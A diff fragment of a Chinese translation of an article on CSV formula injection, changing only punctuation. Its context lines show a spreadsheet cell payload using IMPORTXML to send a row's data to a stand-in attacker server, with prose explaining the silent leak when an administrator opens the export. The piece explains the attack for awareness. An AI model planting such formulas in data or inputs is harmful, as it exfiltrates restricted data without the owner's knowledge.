@@ -97,7 +97,7 @@ UserId,BillToDate,ProjectName,Description,DurationMinutes
 2,2017-07-25,Important Client,"=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")",240
 ```
 
-攻击者以符号 `=` 作为单元格的开头，然后把 `IMPORTXML` 的地址指向了一个攻击者的服务器，并把电子表格的数据作为查询字符串附在该地址上。现在攻击者可以打开他们的服务器日志然后 **yoooooo**！。终于拿到了不属于他们的数据。[在 Requestb.in 上自己试一试](https://requestb.in/)。
+攻击者以符号 `=` 作为单元格的开头，然后把 `IMPORTXML` 的地址指向了一个攻击者的服务器，并把电子表格的数据作为查询字符串附在该地址上。现在攻击者可以打开他们的服务器日志然后 **yoooooo**。终于拿到了不属于他们的数据。[在 Requestb.in 上自己试一试](https://requestb.in/)。
 
 有什么踪迹会留下来吗？没有警告，没有弹框，没有任何理由认为有出现过什么问题。攻击者只是输入了一个格式过的时间／问题／其他数据的条目，最终管理员当要看导出的 CSV 文件时，所有限制访问的数据都会瞬间，并悄悄地传输出去了。
 
